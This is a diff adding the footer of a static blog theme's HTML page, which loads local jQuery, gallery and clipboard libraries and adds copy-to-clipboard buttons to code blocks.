+<script src="/lib/jquery/jquery.min.js"></script>
+
+
+<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
+
+<!-- clipboard -->
+
+  
+<script src="/lib/clipboard/clipboard.min.js"></script>
+
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Disqus Comments -->
+
+
+</body>
+</html>
